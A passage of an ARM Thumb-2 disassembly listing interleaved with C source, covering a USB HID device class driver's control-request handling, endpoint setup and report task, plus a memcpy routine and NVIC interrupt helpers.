 80028fc:	4a12      	ldr	r2, [pc, #72]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 80028fe:	4413      	add	r3, r2
 8002900:	3304      	adds	r3, #4
 8002902:	61fb      	str	r3, [r7, #28]
		return ep->InInUse == 0 && ep->IsEnabled;
 8002904:	69fb      	ldr	r3, [r7, #28]
 8002906:	685b      	ldr	r3, [r3, #4]
 8002908:	f3c3 1300 	ubfx	r3, r3, #4, #1
 800290c:	b2db      	uxtb	r3, r3
 800290e:	2b00      	cmp	r3, #0
 8002910:	d108      	bne.n	8002924 <HID_Device_ProcessControlRequest+0x2b4>
 8002912:	69fb      	ldr	r3, [r7, #28]
 8002914:	791b      	ldrb	r3, [r3, #4]
 8002916:	f003 0302 	and.w	r3, r3, #2
 800291a:	b2db      	uxtb	r3, r3
 800291c:	2b00      	cmp	r3, #0
 800291e:	d001      	beq.n	8002924 <HID_Device_ProcessControlRequest+0x2b4>
 8002920:	2301      	movs	r3, #1
 8002922:	e000      	b.n	8002926 <HID_Device_ProcessControlRequest+0x2b6>
 8002924:	2300      	movs	r3, #0
 8002926:	f003 0301 	and.w	r3, r3, #1
 800292a:	b2db      	uxtb	r3, r3
 800292c:	f083 0301 	eor.w	r3, r3, #1
 8002930:	b2db      	uxtb	r3, r3
 8002932:	2b00      	cmp	r3, #0
 8002934:	d1db      	bne.n	80028ee <HID_Device_ProcessControlRequest+0x27e>
				Endpoint_Write_8(HIDInterfaceInfo->State.UsingReportProtocol);
 8002936:	68fb      	ldr	r3, [r7, #12]
 8002938:	7c1b      	ldrb	r3, [r3, #16]
 800293a:	4618      	mov	r0, r3
 800293c:	f000 fb7e 	bl	800303c <Endpoint_Write_8>
				Endpoint_ClearIN();
 8002940:	f000 fad2 	bl	8002ee8 <Endpoint_ClearIN>
	}
 8002944:	bf00      	nop
				Endpoint_ClearStatusStage();
			}

			break;
 8002946:	e079      	b.n	8002a3c <HID_Device_ProcessControlRequest+0x3cc>
 8002948:	2000070c 	.word	0x2000070c
 800294c:	20000c94 	.word	0x20000c94
		case HID_REQ_SetProtocol:
			if (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))
 8002950:	4b40      	ldr	r3, [pc, #256]	; (8002a54 <HID_Device_ProcessControlRequest+0x3e4>)
 8002952:	781b      	ldrb	r3, [r3, #0]
 8002954:	2b21      	cmp	r3, #33	; 0x21
 8002956:	d173      	bne.n	8002a40 <HID_Device_ProcessControlRequest+0x3d0>
		device.IsSetupRecieved = 0;
 8002958:	4a3f      	ldr	r2, [pc, #252]	; (8002a58 <HID_Device_ProcessControlRequest+0x3e8>)
 800295a:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 800295e:	f36f 0341 	bfc	r3, #1, #1
 8002962:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	}
 8002966:	bf00      	nop
	}
 8002968:	bf00      	nop
			{
				Endpoint_ClearSETUP();
				Endpoint_ClearStatusStage();

				HIDInterfaceInfo->State.UsingReportProtocol = ((USB_ControlRequest.wValue & 0xFF) != 0x00);
 800296a:	4b3a      	ldr	r3, [pc, #232]	; (8002a54 <HID_Device_ProcessControlRequest+0x3e4>)
 800296c:	885b      	ldrh	r3, [r3, #2]
 800296e:	b29b      	uxth	r3, r3
 8002970:	b2db      	uxtb	r3, r3
 8002972:	2b00      	cmp	r3, #0
 8002974:	bf14      	ite	ne
 8002976:	2301      	movne	r3, #1
 8002978:	2300      	moveq	r3, #0
 800297a:	b2da      	uxtb	r2, r3
 800297c:	68fb      	ldr	r3, [r7, #12]
 800297e:	741a      	strb	r2, [r3, #16]
			}

			break;
 8002980:	e05e      	b.n	8002a40 <HID_Device_ProcessControlRequest+0x3d0>
		case HID_REQ_SetIdle:
			if (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))
 8002982:	4b34      	ldr	r3, [pc, #208]	; (8002a54 <HID_Device_ProcessControlRequest+0x3e4>)
 8002984:	781b      	ldrb	r3, [r3, #0]
 8002986:	2b21      	cmp	r3, #33	; 0x21
 8002988:	d15c      	bne.n	8002a44 <HID_Device_ProcessControlRequest+0x3d4>
		device.IsSetupRecieved = 0;
 800298a:	4a33      	ldr	r2, [pc, #204]	; (8002a58 <HID_Device_ProcessControlRequest+0x3e8>)
 800298c:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8002990:	f36f 0341 	bfc	r3, #1, #1
 8002994:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	}
 8002998:	bf00      	nop
	}
 800299a:	bf00      	nop
			{
				Endpoint_ClearSETUP();
				Endpoint_ClearStatusStage();

				HIDInterfaceInfo->State.IdleCount = ((USB_ControlRequest.wValue & 0xFF00) >> 6);
 800299c:	4b2d      	ldr	r3, [pc, #180]	; (8002a54 <HID_Device_ProcessControlRequest+0x3e4>)
 800299e:	885b      	ldrh	r3, [r3, #2]
 80029a0:	b29b      	uxth	r3, r3
 80029a2:	119b      	asrs	r3, r3, #6
 80029a4:	b29b      	uxth	r3, r3
 80029a6:	f403 737f 	and.w	r3, r3, #1020	; 0x3fc
 80029aa:	b29a      	uxth	r2, r3
 80029ac:	68fb      	ldr	r3, [r7, #12]
 80029ae:	829a      	strh	r2, [r3, #20]
			}

			break;
 80029b0:	e048      	b.n	8002a44 <HID_Device_ProcessControlRequest+0x3d4>
		case HID_REQ_GetIdle:
			if (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))
 80029b2:	4b28      	ldr	r3, [pc, #160]	; (8002a54 <HID_Device_ProcessControlRequest+0x3e4>)
 80029b4:	781b      	ldrb	r3, [r3, #0]
 80029b6:	2ba1      	cmp	r3, #161	; 0xa1
 80029b8:	d146      	bne.n	8002a48 <HID_Device_ProcessControlRequest+0x3d8>
		device.IsSetupRecieved = 0;
 80029ba:	4a27      	ldr	r2, [pc, #156]	; (8002a58 <HID_Device_ProcessControlRequest+0x3e8>)
 80029bc:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 80029c0:	f36f 0341 	bfc	r3, #1, #1
 80029c4:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	}
 80029c8:	bf00      	nop
			{
				Endpoint_ClearSETUP();
				while (!(Endpoint_IsINReady()));
 80029ca:	bf00      	nop
		USBD_Endpoint_t *ep = &device.Endpoints[device.CurrentEndpoint];
 80029cc:	4b22      	ldr	r3, [pc, #136]	; (8002a58 <HID_Device_ProcessControlRequest+0x3e8>)
 80029ce:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 80029d2:	461a      	mov	r2, r3
 80029d4:	232c      	movs	r3, #44	; 0x2c
 80029d6:	fb02 f303 	mul.w	r3, r2, r3
 80029da:	4a1f      	ldr	r2, [pc, #124]	; (8002a58 <HID_Device_ProcessControlRequest+0x3e8>)
 80029dc:	4413      	add	r3, r2
 80029de:	3304      	adds	r3, #4
 80029e0:	61bb      	str	r3, [r7, #24]
		return ep->InInUse == 0 && ep->IsEnabled;
 80029e2:	69bb      	ldr	r3, [r7, #24]
 80029e4:	685b      	ldr	r3, [r3, #4]
 80029e6:	f3c3 1300 	ubfx	r3, r3, #4, #1
 80029ea:	b2db      	uxtb	r3, r3
 80029ec:	2b00      	cmp	r3, #0
 80029ee:	d108      	bne.n	8002a02 <HID_Device_ProcessControlRequest+0x392>
 80029f0:	69bb      	ldr	r3, [r7, #24]
 80029f2:	791b      	ldrb	r3, [r3, #4]
 80029f4:	f003 0302 	and.w	r3, r3, #2
 80029f8:	b2db      	uxtb	r3, r3
 80029fa:	2b00      	cmp	r3, #0
 80029fc:	d001      	beq.n	8002a02 <HID_Device_ProcessControlRequest+0x392>
 80029fe:	2301      	movs	r3, #1
 8002a00:	e000      	b.n	8002a04 <HID_Device_ProcessControlRequest+0x394>
 8002a02:	2300      	movs	r3, #0
 8002a04:	f003 0301 	and.w	r3, r3, #1
 8002a08:	b2db      	uxtb	r3, r3
 8002a0a:	f083 0301 	eor.w	r3, r3, #1
 8002a0e:	b2db      	uxtb	r3, r3
 8002a10:	2b00      	cmp	r3, #0
 8002a12:	d1db      	bne.n	80029cc <HID_Device_ProcessControlRequest+0x35c>
				Endpoint_Write_8(HIDInterfaceInfo->State.IdleCount >> 2);
 8002a14:	68fb      	ldr	r3, [r7, #12]
 8002a16:	8a9b      	ldrh	r3, [r3, #20]
 8002a18:	089b      	lsrs	r3, r3, #2
 8002a1a:	b29b      	uxth	r3, r3
 8002a1c:	b2db      	uxtb	r3, r3
 8002a1e:	4618      	mov	r0, r3
 8002a20:	f000 fb0c 	bl	800303c <Endpoint_Write_8>
				Endpoint_ClearIN();
 8002a24:	f000 fa60 	bl	8002ee8 <Endpoint_ClearIN>
	}
 8002a28:	bf00      	nop
				Endpoint_ClearStatusStage();
			}

			break;
 8002a2a:	e00d      	b.n	8002a48 <HID_Device_ProcessControlRequest+0x3d8>
	  return;
 8002a2c:	bf00      	nop
 8002a2e:	e00c      	b.n	8002a4a <HID_Device_ProcessControlRequest+0x3da>
	  return;
 8002a30:	bf00      	nop
 8002a32:	e00a      	b.n	8002a4a <HID_Device_ProcessControlRequest+0x3da>
			break;
 8002a34:	bf00      	nop
 8002a36:	e008      	b.n	8002a4a <HID_Device_ProcessControlRequest+0x3da>
			break;
 8002a38:	bf00      	nop
 8002a3a:	e006      	b.n	8002a4a <HID_Device_ProcessControlRequest+0x3da>
			break;
 8002a3c:	bf00      	nop
 8002a3e:	e004      	b.n	8002a4a <HID_Device_ProcessControlRequest+0x3da>
			break;
 8002a40:	bf00      	nop
 8002a42:	e002      	b.n	8002a4a <HID_Device_ProcessControlRequest+0x3da>
			break;
 8002a44:	bf00      	nop
 8002a46:	e000      	b.n	8002a4a <HID_Device_ProcessControlRequest+0x3da>
			break;
 8002a48:	bf00      	nop
	}
}
 8002a4a:	373c      	adds	r7, #60	; 0x3c
 8002a4c:	46bd      	mov	sp, r7
 8002a4e:	e8bd 8ff0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, fp, pc}
 8002a52:	bf00      	nop
 8002a54:	20000c94 	.word	0x20000c94
 8002a58:	2000070c 	.word	0x2000070c

08002a5c <HID_Device_ConfigureEndpoints>:

bool HID_Device_ConfigureEndpoints(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
 8002a5c:	b580      	push	{r7, lr}
 8002a5e:	b082      	sub	sp, #8
 8002a60:	af00      	add	r7, sp, #0
 8002a62:	6078      	str	r0, [r7, #4]
	memset(&HIDInterfaceInfo->State, 0x00, sizeof(HIDInterfaceInfo->State));
 8002a64:	687b      	ldr	r3, [r7, #4]
 8002a66:	3310      	adds	r3, #16
 8002a68:	2208      	movs	r2, #8
 8002a6a:	2100      	movs	r1, #0
 8002a6c:	4618      	mov	r0, r3
 8002a6e:	f003 fef9 	bl	8006864 <memset>
	HIDInterfaceInfo->State.UsingReportProtocol = true;
 8002a72:	687b      	ldr	r3, [r7, #4]
 8002a74:	2201      	movs	r2, #1
 8002a76:	741a      	strb	r2, [r3, #16]
	HIDInterfaceInfo->State.IdleCount           = 750;
 8002a78:	687b      	ldr	r3, [r7, #4]
 8002a7a:	f240 22ee 	movw	r2, #750	; 0x2ee
 8002a7e:	829a      	strh	r2, [r3, #20]

	HIDInterfaceInfo->Config.ReportINEndpoint.Type = EP_TYPE_INTERRUPT;
 8002a80:	687b      	ldr	r3, [r7, #4]
 8002a82:	2203      	movs	r2, #3
 8002a84:	719a      	strb	r2, [r3, #6]

	if (!(Endpoint_ConfigureEndpointTable(&HIDInterfaceInfo->Config.ReportINEndpoint, 1)))
 8002a86:	687b      	ldr	r3, [r7, #4]
 8002a88:	3302      	adds	r3, #2
 8002a8a:	2101      	movs	r1, #1
 8002a8c:	4618      	mov	r0, r3
 8002a8e:	f000 fbb1 	bl	80031f4 <Endpoint_ConfigureEndpointTable>
 8002a92:	4603      	mov	r3, r0
 8002a94:	f083 0301 	eor.w	r3, r3, #1
 8002a98:	b2db      	uxtb	r3, r3
 8002a9a:	2b00      	cmp	r3, #0
 8002a9c:	d001      	beq.n	8002aa2 <HID_Device_ConfigureEndpoints+0x46>
	  return false;
 8002a9e:	2300      	movs	r3, #0
 8002aa0:	e000      	b.n	8002aa4 <HID_Device_ConfigureEndpoints+0x48>

	return true;
 8002aa2:	2301      	movs	r3, #1
}
 8002aa4:	4618      	mov	r0, r3
 8002aa6:	3708      	adds	r7, #8
 8002aa8:	46bd      	mov	sp, r7
 8002aaa:	bd80      	pop	{r7, pc}

08002aac <HID_Device_USBTask>:

void HID_Device_USBTask(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
 8002aac:	e92d 43f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, lr}
 8002ab0:	b08b      	sub	sp, #44	; 0x2c
 8002ab2:	af02      	add	r7, sp, #8
 8002ab4:	6078      	str	r0, [r7, #4]
	if (USB_DeviceState != DEVICE_STATE_Configured)
 8002ab6:	4b6a      	ldr	r3, [pc, #424]	; (8002c60 <HID_Device_USBTask+0x1b4>)
 8002ab8:	781b      	ldrb	r3, [r3, #0]
 8002aba:	b2db      	uxtb	r3, r3
 8002abc:	2b04      	cmp	r3, #4
 8002abe:	f040 80c8 	bne.w	8002c52 <HID_Device_USBTask+0x1a6>
	  return;

	if (HIDInterfaceInfo->State.PrevFrameNum == USB_Device_GetFrameNumber())
 8002ac2:	687b      	ldr	r3, [r7, #4]
 8002ac4:	8a5e      	ldrh	r6, [r3, #18]
			 *  \return Current USB frame number from the USB controller.
			 */
    
            static inline uint16_t USB_Device_GetFrameNumber(void) ATTR_ALWAYS_INLINE;
            static inline uint16_t USB_Device_GetFrameNumber(void) {
                return device.Driver->GetFrameNumber();
 8002ac6:	4b67      	ldr	r3, [pc, #412]	; (8002c64 <HID_Device_USBTask+0x1b8>)
 8002ac8:	681b      	ldr	r3, [r3, #0]
 8002aca:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8002acc:	4798      	blx	r3
 8002ace:	4603      	mov	r3, r0
 8002ad0:	429e      	cmp	r6, r3
 8002ad2:	f000 80c0 	beq.w	8002c56 <HID_Device_USBTask+0x1aa>
		#else
		return;
		#endif
	}

	Endpoint_SelectEndpoint(HIDInterfaceInfo->Config.ReportINEndpoint.Address);
 8002ad6:	687b      	ldr	r3, [r7, #4]
 8002ad8:	789b      	ldrb	r3, [r3, #2]
 8002ada:	747b      	strb	r3, [r7, #17]
		device.CurrentEndpoint = Address & ENDPOINT_EPNUM_MASK;
 8002adc:	7c7b      	ldrb	r3, [r7, #17]
 8002ade:	f003 030f 	and.w	r3, r3, #15
 8002ae2:	b2da      	uxtb	r2, r3
 8002ae4:	4b5f      	ldr	r3, [pc, #380]	; (8002c64 <HID_Device_USBTask+0x1b8>)
 8002ae6:	f883 213c 	strb.w	r2, [r3, #316]	; 0x13c
		device.CurrentDirection = (Address & ENDPOINT_DIR_MASK);
 8002aea:	7c7b      	ldrb	r3, [r7, #17]
 8002aec:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8002af0:	b2da      	uxtb	r2, r3
 8002af2:	4b5c      	ldr	r3, [pc, #368]	; (8002c64 <HID_Device_USBTask+0x1b8>)
 8002af4:	f883 213d 	strb.w	r2, [r3, #317]	; 0x13d
	}
 8002af8:	bf00      	nop

	if (Endpoint_IsReadWriteAllowed())
 8002afa:	f000 fa6d 	bl	8002fd8 <Endpoint_IsReadWriteAllowed>
 8002afe:	4603      	mov	r3, r0
 8002b00:	2b00      	cmp	r3, #0
 8002b02:	f000 80a9 	beq.w	8002c58 <HID_Device_USBTask+0x1ac>
	{
 8002b06:	466b      	mov	r3, sp
 8002b08:	461e      	mov	r6, r3
		uint8_t  ReportINData[HIDInterfaceInfo->Config.PrevReportINBufferSize];
 8002b0a:	687b      	ldr	r3, [r7, #4]
 8002b0c:	7b19      	ldrb	r1, [r3, #12]
 8002b0e:	460b      	mov	r3, r1
 8002b10:	3b01      	subs	r3, #1
 8002b12:	61bb      	str	r3, [r7, #24]
 8002b14:	b2cb      	uxtb	r3, r1
 8002b16:	2200      	movs	r2, #0
 8002b18:	4698      	mov	r8, r3
 8002b1a:	4691      	mov	r9, r2
 8002b1c:	f04f 0200 	mov.w	r2, #0
 8002b20:	f04f 0300 	mov.w	r3, #0
 8002b24:	ea4f 03c9 	mov.w	r3, r9, lsl #3
 8002b28:	ea43 7358 	orr.w	r3, r3, r8, lsr #29
 8002b2c:	ea4f 02c8 	mov.w	r2, r8, lsl #3
 8002b30:	b2cb      	uxtb	r3, r1
 8002b32:	2200      	movs	r2, #0
 8002b34:	461c      	mov	r4, r3
 8002b36:	4615      	mov	r5, r2
 8002b38:	f04f 0200 	mov.w	r2, #0
 8002b3c:	f04f 0300 	mov.w	r3, #0
 8002b40:	00eb      	lsls	r3, r5, #3
 8002b42:	ea43 7354 	orr.w	r3, r3, r4, lsr #29
 8002b46:	00e2      	lsls	r2, r4, #3
 8002b48:	460b      	mov	r3, r1
 8002b4a:	3307      	adds	r3, #7
 8002b4c:	08db      	lsrs	r3, r3, #3
 8002b4e:	00db      	lsls	r3, r3, #3
 8002b50:	ebad 0d03 	sub.w	sp, sp, r3
 8002b54:	ab02      	add	r3, sp, #8
 8002b56:	3300      	adds	r3, #0
 8002b58:	617b      	str	r3, [r7, #20]
		uint8_t  ReportID     = 0;
 8002b5a:	2300      	movs	r3, #0
 8002b5c:	73fb      	strb	r3, [r7, #15]
		uint16_t ReportINSize = 0;
 8002b5e:	2300      	movs	r3, #0
 8002b60:	81bb      	strh	r3, [r7, #12]

		memset(ReportINData, 0, sizeof(ReportINData));
 8002b62:	460b      	mov	r3, r1
 8002b64:	461a      	mov	r2, r3
 8002b66:	2100      	movs	r1, #0
 8002b68:	6978      	ldr	r0, [r7, #20]
 8002b6a:	f003 fe7b 	bl	8006864 <memset>

		bool ForceSend         = CALLBACK_HID_Device_CreateHIDReport(HIDInterfaceInfo, &ReportID, HID_REPORT_ITEM_In,
 8002b6e:	f107 010f 	add.w	r1, r7, #15
 8002b72:	f107 030c 	add.w	r3, r7, #12
 8002b76:	9300      	str	r3, [sp, #0]
 8002b78:	697b      	ldr	r3, [r7, #20]
 8002b7a:	2200      	movs	r2, #0
 8002b7c:	6878      	ldr	r0, [r7, #4]
 8002b7e:	f7fd fd57 	bl	8000630 <CALLBACK_HID_Device_CreateHIDReport>
 8002b82:	4603      	mov	r3, r0
 8002b84:	74fb      	strb	r3, [r7, #19]
		                                                             ReportINData, &ReportINSize);
		bool StatesChanged     = false;
 8002b86:	2300      	movs	r3, #0
 8002b88:	77fb      	strb	r3, [r7, #31]
		bool IdlePeriodElapsed = (HIDInterfaceInfo->State.IdleCount && !(HIDInterfaceInfo->State.IdleMSRemaining));
 8002b8a:	687b      	ldr	r3, [r7, #4]
 8002b8c:	8a9b      	ldrh	r3, [r3, #20]
 8002b8e:	2b00      	cmp	r3, #0
 8002b90:	d005      	beq.n	8002b9e <HID_Device_USBTask+0xf2>
 8002b92:	687b      	ldr	r3, [r7, #4]
 8002b94:	8adb      	ldrh	r3, [r3, #22]
 8002b96:	2b00      	cmp	r3, #0
 8002b98:	d101      	bne.n	8002b9e <HID_Device_USBTask+0xf2>
 8002b9a:	2301      	movs	r3, #1
 8002b9c:	e000      	b.n	8002ba0 <HID_Device_USBTask+0xf4>
 8002b9e:	2300      	movs	r3, #0
 8002ba0:	74bb      	strb	r3, [r7, #18]
 8002ba2:	7cbb      	ldrb	r3, [r7, #18]
 8002ba4:	f003 0301 	and.w	r3, r3, #1
 8002ba8:	74bb      	strb	r3, [r7, #18]

		if (HIDInterfaceInfo->Config.PrevReportINBuffer != NULL)
 8002baa:	687b      	ldr	r3, [r7, #4]
 8002bac:	689b      	ldr	r3, [r3, #8]
 8002bae:	2b00      	cmp	r3, #0
 8002bb0:	d014      	beq.n	8002bdc <HID_Device_USBTask+0x130>
		{
			StatesChanged = (memcmp(ReportINData, HIDInterfaceInfo->Config.PrevReportINBuffer, ReportINSize) != 0);
 8002bb2:	687b      	ldr	r3, [r7, #4]
 8002bb4:	689b      	ldr	r3, [r3, #8]
 8002bb6:	89ba      	ldrh	r2, [r7, #12]
 8002bb8:	4619      	mov	r1, r3
 8002bba:	6978      	ldr	r0, [r7, #20]
 8002bbc:	f003 fd84 	bl	80066c8 <memcmp>
 8002bc0:	4603      	mov	r3, r0
 8002bc2:	2b00      	cmp	r3, #0
 8002bc4:	bf14      	ite	ne
 8002bc6:	2301      	movne	r3, #1
 8002bc8:	2300      	moveq	r3, #0
 8002bca:	77fb      	strb	r3, [r7, #31]
			MEMCPY(HIDInterfaceInfo->Config.PrevReportINBuffer, ReportINData, HIDInterfaceInfo->Config.PrevReportINBufferSize);
 8002bcc:	687b      	ldr	r3, [r7, #4]
 8002bce:	6898      	ldr	r0, [r3, #8]
 8002bd0:	687b      	ldr	r3, [r7, #4]
 8002bd2:	7b1b      	ldrb	r3, [r3, #12]
 8002bd4:	461a      	mov	r2, r3
 8002bd6:	6979      	ldr	r1, [r7, #20]
 8002bd8:	f000 f846 	bl	8002c68 <thumb2_memcpy>
		}

		if (ReportINSize && (ForceSend || StatesChanged || IdlePeriodElapsed))
 8002bdc:	89bb      	ldrh	r3, [r7, #12]
 8002bde:	2b00      	cmp	r3, #0
 8002be0:	d02d      	beq.n	8002c3e <HID_Device_USBTask+0x192>
 8002be2:	7cfb      	ldrb	r3, [r7, #19]
 8002be4:	2b00      	cmp	r3, #0
 8002be6:	d105      	bne.n	8002bf4 <HID_Device_USBTask+0x148>
 8002be8:	7ffb      	ldrb	r3, [r7, #31]
 8002bea:	2b00      	cmp	r3, #0
 8002bec:	d102      	bne.n	8002bf4 <HID_Device_USBTask+0x148>
 8002bee:	7cbb      	ldrb	r3, [r7, #18]
 8002bf0:	2b00      	cmp	r3, #0
 8002bf2:	d024      	beq.n	8002c3e <HID_Device_USBTask+0x192>
		{
			HIDInterfaceInfo->State.IdleMSRemaining = HIDInterfaceInfo->State.IdleCount;
 8002bf4:	687b      	ldr	r3, [r7, #4]
 8002bf6:	8a9a      	ldrh	r2, [r3, #20]
 8002bf8:	687b      	ldr	r3, [r7, #4]
 8002bfa:	82da      	strh	r2, [r3, #22]

			Endpoint_SelectEndpoint(HIDInterfaceInfo->Config.ReportINEndpoint.Address);
 8002bfc:	687b      	ldr	r3, [r7, #4]
 8002bfe:	789b      	ldrb	r3, [r3, #2]
 8002c00:	743b      	strb	r3, [r7, #16]
		device.CurrentEndpoint = Address & ENDPOINT_EPNUM_MASK;
 8002c02:	7c3b      	ldrb	r3, [r7, #16]
 8002c04:	f003 030f 	and.w	r3, r3, #15
 8002c08:	b2da      	uxtb	r2, r3
 8002c0a:	4b16      	ldr	r3, [pc, #88]	; (8002c64 <HID_Device_USBTask+0x1b8>)
 8002c0c:	f883 213c 	strb.w	r2, [r3, #316]	; 0x13c
		device.CurrentDirection = (Address & ENDPOINT_DIR_MASK);
 8002c10:	7c3b      	ldrb	r3, [r7, #16]
 8002c12:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8002c16:	b2da      	uxtb	r2, r3
 8002c18:	4b12      	ldr	r3, [pc, #72]	; (8002c64 <HID_Device_USBTask+0x1b8>)
 8002c1a:	f883 213d 	strb.w	r2, [r3, #317]	; 0x13d
	}
 8002c1e:	bf00      	nop

			if (ReportID)
 8002c20:	7bfb      	ldrb	r3, [r7, #15]
 8002c22:	2b00      	cmp	r3, #0
 8002c24:	d003      	beq.n	8002c2e <HID_Device_USBTask+0x182>
			  Endpoint_Write_8(ReportID);
 8002c26:	7bfb      	ldrb	r3, [r7, #15]
 8002c28:	4618      	mov	r0, r3
 8002c2a:	f000 fa07 	bl	800303c <Endpoint_Write_8>

			Endpoint_Write_Stream_LE(ReportINData, ReportINSize, NULL);
 8002c2e:	89bb      	ldrh	r3, [r7, #12]
 8002c30:	2200      	movs	r2, #0
 8002c32:	4619      	mov	r1, r3
 8002c34:	6978      	ldr	r0, [r7, #20]
 8002c36:	f000 fb85 	bl	8003344 <Endpoint_Write_Stream_LE>

			Endpoint_ClearIN();
 8002c3a:	f000 f955 	bl	8002ee8 <Endpoint_ClearIN>
 8002c3e:	4b09      	ldr	r3, [pc, #36]	; (8002c64 <HID_Device_USBTask+0x1b8>)
 8002c40:	681b      	ldr	r3, [r3, #0]
 8002c42:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8002c44:	4798      	blx	r3
 8002c46:	4603      	mov	r3, r0
 8002c48:	461a      	mov	r2, r3
		}

		HIDInterfaceInfo->State.PrevFrameNum = USB_Device_GetFrameNumber();
 8002c4a:	687b      	ldr	r3, [r7, #4]
 8002c4c:	825a      	strh	r2, [r3, #18]
 8002c4e:	46b5      	mov	sp, r6
 8002c50:	e002      	b.n	8002c58 <HID_Device_USBTask+0x1ac>
	  return;
 8002c52:	bf00      	nop
 8002c54:	e000      	b.n	8002c58 <HID_Device_USBTask+0x1ac>
		return;
 8002c56:	bf00      	nop
	}
}
 8002c58:	3724      	adds	r7, #36	; 0x24
 8002c5a:	46bd      	mov	sp, r7
 8002c5c:	e8bd 83f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, pc}
 8002c60:	20000c9c 	.word	0x20000c9c
 8002c64:	2000070c 	.word	0x2000070c

08002c68 <thumb2_memcpy>:
   stack to improve its performance.  It copies 4 bytes at a time and
   unrolls the loop to perform 4 of these copies per loop iteration.
*/
__attribute__((naked)) void thumb2_memcpy(void* pDest, const void* pSource, size_t length)
{
    __asm (
 8002c68:	0913      	lsrs	r3, r2, #4
 8002c6a:	d011      	beq.n	8002c90 <thumb2_memcpy+0x28>
 8002c6c:	f851 cb04 	ldr.w	ip, [r1], #4
 8002c70:	f840 cb04 	str.w	ip, [r0], #4
 8002c74:	f851 cb04 	ldr.w	ip, [r1], #4
 8002c78:	f840 cb04 	str.w	ip, [r0], #4
 8002c7c:	f851 cb04 	ldr.w	ip, [r1], #4
 8002c80:	f840 cb04 	str.w	ip, [r0], #4
 8002c84:	f851 cb04 	ldr.w	ip, [r1], #4
 8002c88:	f840 cb04 	str.w	ip, [r0], #4
 8002c8c:	3b01      	subs	r3, #1
 8002c8e:	d1ed      	bne.n	8002c6c <thumb2_memcpy+0x4>
 8002c90:	f012 030f 	ands.w	r3, r2, #15
 8002c94:	d005      	beq.n	8002ca2 <thumb2_memcpy+0x3a>
 8002c96:	f811 cb01 	ldrb.w	ip, [r1], #1
 8002c9a:	f800 cb01 	strb.w	ip, [r0], #1
 8002c9e:	3b01      	subs	r3, #1
 8002ca0:	d1f9      	bne.n	8002c96 <thumb2_memcpy+0x2e>
 8002ca2:	4770      	bx	lr
        "    bne     3$\n"

        // Return to caller.
        "4$: bx      lr\n"
    );
}
 8002ca4:	bf00      	nop
	...

08002ca8 <__NVIC_EnableIRQ>:
{
 8002ca8:	b480      	push	{r7}
 8002caa:	b083      	sub	sp, #12
 8002cac:	af00      	add	r7, sp, #0
 8002cae:	4603      	mov	r3, r0
 8002cb0:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8002cb2:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8002cb6:	2b00      	cmp	r3, #0
 8002cb8:	db0b      	blt.n	8002cd2 <__NVIC_EnableIRQ+0x2a>
    NVIC->ISER[(((uint32_t)(int32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)(int32_t)IRQn) & 0x1FUL));
 8002cba:	79fb      	ldrb	r3, [r7, #7]
 8002cbc:	f003 021f 	and.w	r2, r3, #31
 8002cc0:	4907      	ldr	r1, [pc, #28]	; (8002ce0 <__NVIC_EnableIRQ+0x38>)
 8002cc2:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8002cc6:	095b      	lsrs	r3, r3, #5
 8002cc8:	2001      	movs	r0, #1
 8002cca:	fa00 f202 	lsl.w	r2, r0, r2
 8002cce:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
}
 8002cd2:	bf00      	nop
 8002cd4:	370c      	adds	r7, #12
 8002cd6:	46bd      	mov	sp, r7
 8002cd8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002cdc:	4770      	bx	lr
 8002cde:	bf00      	nop
 8002ce0:	e000e100 	.word	0xe000e100

08002ce4 <__NVIC_DisableIRQ>:
{
 8002ce4:	b480      	push	{r7}
 8002ce6:	b083      	sub	sp, #12
 8002ce8:	af00      	add	r7, sp, #0
 8002cea:	4603      	mov	r3, r0
 8002cec:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8002cee:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8002cf2:	2b00      	cmp	r3, #0
 8002cf4:	db12      	blt.n	8002d1c <__NVIC_DisableIRQ+0x38>
    NVIC->ICER[(((uint32_t)(int32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)(int32_t)IRQn) & 0x1FUL));
 8002cf6:	79fb      	ldrb	r3, [r7, #7]
 8002cf8:	f003 021f 	and.w	r2, r3, #31
 8002cfc:	490a      	ldr	r1, [pc, #40]	; (8002d28 <__NVIC_DisableIRQ+0x44>)
 8002cfe:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8002d02:	095b      	lsrs	r3, r3, #5
 8002d04:	2001      	movs	r0, #1
 8002d06:	fa00 f202 	lsl.w	r2, r0, r2
 8002d0a:	3320      	adds	r3, #32
 8002d0c:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
  \details Acts as a special kind of Data Memory Barrier.
           It completes when all explicit memory accesses before this instruction complete.
 */
